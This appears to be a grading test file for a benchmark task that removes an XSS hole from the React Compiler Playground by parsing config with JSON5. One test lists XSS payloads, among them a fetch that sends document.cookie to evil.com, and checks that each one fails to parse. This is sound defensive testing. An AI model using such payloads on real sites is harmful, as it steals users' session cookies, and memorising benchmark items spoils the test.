"""
Task: react-compiler-playground-json5-config
Repo: facebook/react @ 74568e8627aa43469b74f2972f427a209639d0b6
PR:   36159

Replace unsafe new Function() config parsing with JSON5.parse() in the
React Compiler Playground to eliminate an XSS vulnerability.

All checks must pass for reward = 1. Any failure = reward 0.
Each test function maps 1:1 to a check in eval_manifest.yaml.
"""

import json
import subprocess
from pathlib import Path

PLAYGROUND = "/workspace/react/compiler/apps/playground"


# ---------------------------------------------------------------------------
# Fail-to-pass (pr_diff) — core behavioral tests
# ---------------------------------------------------------------------------

# [pr_diff] fail_to_pass
def test_bare_json5_object_accepted():
    """A plain JSON5 object (no import wrapper) must parse successfully.

    On the base commit, bare objects like { compilationMode: "all" } throw
    'Invalid override format' because the regex expects an import prefix.
    The fix should accept bare JSON5 directly via JSON5.parse().
    """
    test_js = r"""
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const JSON5 = require('json5');
const fs = require('fs');

// Extract parseConfigOverrides from compilation.ts source
const src = fs.readFileSync('lib/compilation.ts', 'utf8');
const match = src.match(/export function parseConfigOverrides[\s\S]*?^}/m);
if (!match) {
    console.error('parseConfigOverrides function not found in compilation.ts');
    process.exit(1);
}

// Evaluate the function in a context with JSON5 available
const fnBody = match[0]
    .replace(/export function/, 'function')
    .replace(/: string/g, '')
    .replace(/: any/g, '');
const fn = new Function('JSON5', `${fnBody}; return parseConfigOverrides;`)(JSON5);

// Test 1: Simple object with unquoted key
let r = fn('{ compilationMode: "all" }');
console.assert(r.compilationMode === 'all',
    `Expected compilationMode=all, got ${JSON.stringify(r)}`);

// Test 2: Object with trailing comma
r = fn('{ "compilationMode": "infer", }');
console.assert(r.compilationMode === 'infer',
    `Expected compilationMode=infer, got ${JSON.stringify(r)}`);

// Test 3: Nested object
r = fn('{ environment: { validateRefAccessDuringRender: true } }');
console.assert(r.environment.validateRefAccessDuringRender === true,
    `Expected nested bool true, got ${JSON.stringify(r)}`);

process.exit(0);
"""
    r = subprocess.run(
        ["node", "--input-type=module"],
        input=test_js.encode(),
        cwd=PLAYGROUND,
        capture_output=True,
        timeout=30,
    )
    assert r.returncode == 0, (
        f"Bare JSON5 object parsing failed:\n"
        f"stdout: {r.stdout.decode()}\nstderr: {r.stderr.decode()}"
    )


# [pr_diff] fail_to_pass
def test_xss_payloads_rejected():
    """XSS payloads must throw when passed through config parsing.

    On the base commit, payloads matching the import pattern are executed
    via new Function(). The fix uses JSON5.parse() which rejects JS code.
    """
    test_js = r"""
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const JSON5 = require('json5');
const fs = require('fs');

const src = fs.readFileSync('lib/compilation.ts', 'utf8');
const match = src.match(/export function parseConfigOverrides[\s\S]*?^}/m);
if (!match) {
    console.error('parseConfigOverrides function not found');
    process.exit(1);
}

const fnBody = match[0]
    .replace(/export function/, 'function')
    .replace(/: string/g, '')
    .replace(/: any/g, '');
const fn = new Function('JSON5', `${fnBody}; return parseConfigOverrides;`)(JSON5);

const payloads = [
    '(function(){ document.title = "hacked"; return {}; })()',
    'eval("alert(1)")',
    'someVar',
    'fetch("https://evil.com?c=" + document.cookie)',
    '(() => ({ compilationMode: "all" }))()',
    'new String("all")',
];

let allPassed = true;
for (const payload of payloads) {
    let threw = false;
    try { fn(payload); } catch(e) { threw = true; }
    if (!threw) {
        console.error(`FAIL: payload did not throw: ${payload}`);
        allPassed = false;
    }
}

if (!allPassed) process.exit(1);
process.exit(0);
"""
    r = subprocess.run(
        ["node", "--input-type=module"],
        input=test_js.encode(),
        cwd=PLAYGROUND,
        capture_output=True,
        timeout=30,
    )
    assert r.returncode == 0, (
        f"XSS payload rejection failed:\n"
        f"stdout: {r.stdout.decode()}\nstderr: {r.stderr.decode()}"
    )


# [pr_diff] fail_to_pass
def test_empty_config_returns_empty_object():
    """Empty and whitespace-only config strings must return {}.

    On the base commit, empty string returns {} (same behavior), but
    whitespace-only strings throw 'Invalid override format'.
    """
    test_js = r"""
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const JSON5 = require('json5');
const fs = require('fs');

const src = fs.readFileSync('lib/compilation.ts', 'utf8');
const match = src.match(/export function parseConfigOverrides[\s\S]*?^}/m);
if (!match) {
    console.error('parseConfigOverrides function not found');
    process.exit(1);
}

const fnBody = match[0]
    .replace(/export function/, 'function')
    .replace(/: string/g, '')
    .replace(/: any/g, '');
const fn = new Function('JSON5', `${fnBody}; return parseConfigOverrides;`)(JSON5);

// Empty string
let r = fn('');
console.assert(JSON.stringify(r) === '{}', `empty string: got ${JSON.stringify(r)}`);

// Whitespace-only
r = fn('   \n\t  ');
console.assert(JSON.stringify(r) === '{}', `whitespace: got ${JSON.stringify(r)}`);

// Single space
r = fn(' ');
console.assert(JSON.stringify(r) === '{}', `single space: got ${JSON.stringify(r)}`);

process.exit(0);
"""
    r = subprocess.run(
        ["node", "--input-type=module"],
        input=test_js.encode(),
        cwd=PLAYGROUND,
        capture_output=True,
        timeout=30,
    )
    assert r.returncode == 0, (
        f"Empty config test failed:\n"
        f"stdout: {r.stdout.decode()}\nstderr: {r.stderr.decode()}"
    )


# [pr_diff] fail_to_pass
def test_default_config_is_plain_json5():
    """defaultStore.ts default config must be plain JSON5, not TypeScript syntax.

    On the base commit, the default config uses 'import type { PluginOptions }'
    and 'satisfies PluginOptions'. The fix removes these TS constructs.
    """
    src = Path(f"{PLAYGROUND}/lib/defaultStore.ts").read_text()

    assert "import type { PluginOptions }" not in src, (
        "TypeScript 'import type' still present in defaultStore.ts"
    )
    assert "satisfies PluginOptions" not in src, (
        "'satisfies PluginOptions' still present in defaultStore.ts"
    )

    # Verify the default config is valid JSON5 by parsing it
    test_js = r"""
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const JSON5 = require('json5');
const fs = require('fs');

const src = fs.readFileSync('lib/defaultStore.ts', 'utf8');
// Extract the template literal content from defaultConfig
const match = src.match(/export const defaultConfig = `([\s\S]*?)`;/);
if (!match) {
    console.error('defaultConfig not found in defaultStore.ts');
    process.exit(1);
}

const configStr = match[1].replace(/^\\/, '').trim();
// Should parse without error (comments are OK, result may be {})
try {
    JSON5.parse(configStr);
} catch(e) {
    console.error(`Default config is not valid JSON5: ${e.message}`);
    console.error(`Config string: ${configStr}`);
    process.exit(1);
}
process.exit(0);
"""
    r = subprocess.run(
        ["node", "--input-type=module"],
        input=test_js.encode(),
        cwd=PLAYGROUND,
        capture_output=True,
        timeout=30,
    )
    assert r.returncode == 0, (
        f"Default config JSON5 validation failed:\n"
        f"stdout: {r.stdout.decode()}\nstderr: {r.stderr.decode()}"
    )


# [pr_diff] fail_to_pass
def test_no_new_function_xss():
    """new Function() must not appear in compilation.ts (XSS vector)."""
    src = Path(f"{PLAYGROUND}/lib/compilation.ts").read_text()
    assert "new Function" not in src, (
        "new Function() still present in compilation.ts — XSS vulnerability not fixed"
    )


# [pr_diff] fail_to_pass
def test_json5_dependency_in_package_json():
    """json5 must be declared as a dependency in package.json."""
    pkg = json.loads(Path(f"{PLAYGROUND}/package.json").read_text())
    deps = {**pkg.get("dependencies", {}), **pkg.get("devDependencies", {})}
    assert "json5" in deps, "json5 not found in package.json dependencies"


# ---------------------------------------------------------------------------
# Pass-to-pass — JSON5 comment support and regression
# ---------------------------------------------------------------------------

# [pr_diff] fail_to_pass
def test_json5_comments_supported():
    """JSON5 single-line and block comments must parse correctly.

    On the base commit, parseConfigOverrides doesn't exist so this fails.
    On the fix, JSON5.parse handles comments natively.
    """
    test_js = r"""
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const JSON5 = require('json5');
const fs = require('fs');

const src = fs.readFileSync('lib/compilation.ts', 'utf8');
const match = src.match(/export function parseConfigOverrides[\s\S]*?^}/m);
if (!match) {
    console.error('parseConfigOverrides function not found');
    process.exit(1);
}

const fnBody = match[0]
    .replace(/export function/, 'function')
    .replace(/: string/g, '')
    .replace(/: any/g, '');
const fn = new Function('JSON5', `${fnBody}; return parseConfigOverrides;`)(JSON5);

// Single-line comment (default config pattern)
let r = fn('{ //compilationMode: "all"\n}');
console.assert(JSON.stringify(r) === '{}', `single-line comment: got ${JSON.stringify(r)}`);

// Block comment
r = fn('{ /* disabled */ compilationMode: "all" }');
console.assert(r.compilationMode === 'all', `block comment: got ${JSON.stringify(r)}`);

// Mixed comments and values
r = fn(`{
  // This is commented out
  /* Also commented */
  compilationMode: "infer",  // inline comment
}`);
console.assert(r.compilationMode === 'infer', `mixed comments: got ${JSON.stringify(r)}`);

process.exit(0);
"""
    r = subprocess.run(
        ["node", "--input-type=module"],
        input=test_js.encode(),
        cwd=PLAYGROUND,
        capture_output=True,
        timeout=30,
    )
    assert r.returncode == 0, (
        f"JSON5 comment support test failed:\n"
        f"stdout: {r.stdout.decode()}\nstderr: {r.stderr.decode()}"
    )


# ---------------------------------------------------------------------------
# Anti-stub (static) — parseConfigOverrides must have real logic
# ---------------------------------------------------------------------------

# [static] pass_to_pass
def test_parse_config_overrides_not_stub():
    """parseConfigOverrides must be a real exported function, not a stub."""
    src = Path(f"{PLAYGROUND}/lib/compilation.ts").read_text()

    # Must be exported
    assert "export function parseConfigOverrides" in src, (
        "parseConfigOverrides not exported from compilation.ts"
    )

    # Must use JSON5 (not just return {} or hardcode)
    assert "JSON5" in src, (
        "JSON5 not referenced in compilation.ts — function may be a stub"
    )

    # Must import json5
    assert "json5" in src.lower(), (
        "json5 import not found in compilation.ts"
    )
